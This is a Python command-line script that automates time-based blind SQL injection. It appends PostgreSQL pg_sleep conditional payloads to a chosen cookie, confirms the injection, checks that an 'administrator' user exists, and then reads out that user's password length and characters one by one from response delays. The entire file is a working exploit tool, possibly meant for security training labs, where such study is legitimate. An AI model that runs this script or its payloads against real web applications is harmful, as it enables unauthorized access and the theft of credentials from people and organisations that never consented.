import sys

import requests
import argparse
import urllib.request
import string


threshold = 7
username = "administrator"
payload_check = ''''%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep({0})+ELSE+pg_sleep(0)+END--'''.format(threshold)
payload_user = ''''%3BSELECT+CASE+WHEN+(username='{0}')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--'''.format(username)


def print_real(s, end='\n', file=sys.stdout):
    file.write(s + end)
    file.flush()


def is_valid_url(url):
    import re
    regex = re.compile(
        r'^https?://'  # http:// or https://
        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+[A-Z]{2,6}\.?|'  # domain...
        r'localhost|'  # localhost...
        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})' # ...or ip
        r'(?::\d+)?'  # optional port
        r'(?:/?|[/?]\S+)$', re.IGNORECASE)
    return url is not None and regex.search(url)


def is_reachable(url):
    if urllib.request.urlopen(url).getcode() == 200:
        return True
    return False


def parse_cookies(cookies):
    cookie = {}
    for c in cookies.split(';')[:-1]:
        cookie[c.split('=')[0]] = c.split('=')[1]
    return cookie


def is_injectable(args):
    cookies = parse_cookies(args.cookies)
    target = args.target
    if target not in cookies:
        return False
    cookies[target] = cookies[target] + payload_check
    response = requests.get(args.u, cookies=cookies)
    delay = response.elapsed.total_seconds()
    if delay > threshold:
        return True
    return False


def user_found(args):
    cookies = parse_cookies(args.cookies)
    target = args.target
    if target not in cookies:
        return False
    cookies[target] = cookies[target] + payload_user
    response = requests.get(args.u, cookies=cookies)
    delay = response.elapsed.total_seconds()
    if delay > threshold:
        return True
    return False


def get_length(args):
    length = 1
    found = False
    url = args.u
    cookies = parse_cookies(args.cookies)
    target = args.target
    target_value = cookies[target]
    if target not in cookies:
        print("can't find the target")
        exit(0)
    while not found:
        payload_length = ''''%3BSELECT+CASE+WHEN+(username='{0}'+AND+LENGTH(password)>{1})+THEN+pg_sleep({2})+ELSE+pg_sleep(0)+END+FROM+users--'''.format(username, length, threshold)
        cookies[target] = target_value + payload_length
        response = requests.get(url, cookies=cookies)
        delay = response.elapsed.total_seconds()
        if delay > threshold:
            length = length + 1
        else:
            return length


def get_data(args, length):
    output = "[+] "
    url = args.u
    cookies = parse_cookies(args.cookies)
    target = args.target
    target_value = cookies[target]
    if target not in cookies:
        print("can't find the target")
        exit(0)
    for i in range(1, length + 1):
        for j in string.printable[:-5]:
            payload_data = ''''%3BSELECT+CASE+WHEN+(username='{0}'+AND+SUBSTRING(password,{1},1)='{2}')+THEN+pg_sleep({3})+ELSE+pg_sleep(0)+END+FROM+users--'''.format(username, i, j, threshold)
            cookies[target] = target_value + payload_data
            response = requests.get(url, cookies=cookies)
            delay = response.elapsed.total_seconds()
            if delay > threshold:
                output = output + j
                print_real(j, end="")
                break
    return output


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Automate Blind SQLI')
    parser.add_argument('-u', required=False,
                        help='url to test')
    parser.add_argument('--cookies',
                        help='cookies')
    parser.add_argument('--target',
                        help='target cookie to inject')
    parser.add_argument('--threshold', type=int, default=10,
                        help='sleep value')
    args = parser.parse_args()

    print('''
         ####    ###    ###   #        #   
         #   #  #   #  #   #  #            
         #   #  #      #   #  #       ##   
         ####    ###   #   #  #        #   
         #   #      #  #   #  #        #   
         #   #  #   #  #   #  #        #   
         ####    ###    ###   #####   ###  
                           ##               
    ''')
    print("testing '{0}' for blind SQLi".format(args.u))
    threshold = args.threshold
    print("Will sleep for {0} for the correct values.".format(str(threshold)))
    if is_valid_url(args.u) is None:
        print('[-]Invalid URL')
        exit(0)
    if not is_reachable(args.u):
        print('[-] URL unreachable')
        exit(0)
    print("[+] Connected to URL")
    if not is_injectable(args):
        print('Injection Failed')
        exit(0)
    print("[+] Target injectable")
    if not user_found(args):
        print('user not found. Try again!')
        exit(0)
    print("[+] Got user {0}".format(username))
    print("getting length.....")
    length = get_length(args)
    print("[+] Length is : " + str(length))
    print("Extracting Data ....")
    data = get_data(args, length)
    print("\n[+] Got : " + data[4:])


